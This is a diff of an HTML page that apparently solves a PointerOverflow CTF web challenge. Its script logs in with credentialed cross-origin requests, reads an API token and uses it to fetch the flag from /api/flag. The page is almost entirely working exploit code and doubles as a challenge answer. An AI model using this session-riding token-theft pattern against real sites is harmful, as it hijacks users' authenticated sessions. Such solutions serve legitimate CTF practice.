@@ -1,65 +1,52 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Community Accounts Demo</title>
+  <meta charset="UTF-8">
+  <title>PointerOverflow CTF Flag Fetcher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: system-ui,Segoe UI,Roboto,Arial; margin: 2rem; }
+    body { font-family: system-ui, sans-serif; margin: 2rem; }
+    button { padding: 0.5rem 1rem; font-size: 1rem; cursor: pointer; }
     pre { background: #f0f0f0; padding: 1rem; }
-    button { margin-top: 1rem; padding: 0.5rem 1rem; font-size: 1rem; }
   </style>
 </head>
 <body>
-  <h1>Community Accounts Demo</h1>
-  <p>Click the button to login, get your token, and fetch the flag.</p>
-  <button id="start">Run</button>
-  <pre id="out"></pre>
+  <h1>Fetch Your Flag</h1>
+  <button id="fetchFlag">Get Flag</button>
+  <pre id="output"></pre>
 
   <script>
-    const out = document.getElementById('out');
-    const log = (x) => out.textContent += x + "\n";
+    const out = document.getElementById('output');
+    const log = (msg) => out.textContent += msg + "\n";
 
     async function call(path, init) {
-      const res = await fetch(path, Object.assign({ credentials: 'include' }, init || {}));
+      const res = await fetch(path, { credentials: 'include', ...init });
       const text = await res.text();
-      return { status: res.status, text, json: async () => JSON.parse(text) };
+      return { status: res.status, text, json: () => JSON.parse(text) };
     }
 
-    async function run() {
-      log("Starting...");
+    document.getElementById('fetchFlag').onclick = async () => {
+      out.textContent = "Starting...\n";
 
       // 1️⃣ Login
       const loginRes = await call('https://web200-1.pointeroverflowctf.com/login', { method: 'POST' });
       log(`Login: ${loginRes.status} ${loginRes.text}`);
 
-      // 2️⃣ Get session token
+      // 2️⃣ Get token
       const tokenRes = await call('https://web200-1.pointeroverflowctf.com/api/token');
       log(`Token response: ${tokenRes.status} ${tokenRes.text}`);
 
       let token;
-      try {
-        const tokenJson = await tokenRes.json(); // ✅ await JSON
-        token = tokenJson.apiToken;             // ✅ correct property
-      } catch {
-        log("Failed to parse token. Check login first.");
-        return;
-      }
-
+      try { token = (await tokenRes.json()).apiToken; } 
+      catch (e) { log("Failed to parse token"); return; }
       log(`Token: ${token}`);
 
-      // 3️⃣ Fetch flag using token
-      const flagRes = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
-        method: 'GET',
-        headers: { 'X-Flag-Token': token },
-        credentials: 'include'
+      // 3️⃣ Get flag
+      const flagRes = await call('https://web200-1.pointeroverflowctf.com/api/flag', {
+        headers: { 'X-Flag-Token': token }
       });
-
-      const flagText = await flagRes.text();
-      log(`Flag: ${flagText}`);
-    }
-
-    document.getElementById('start').onclick = run;
+      log(`Flag: ${flagRes.text}`);
+    };
   </script>
 </body>
 </html>
-
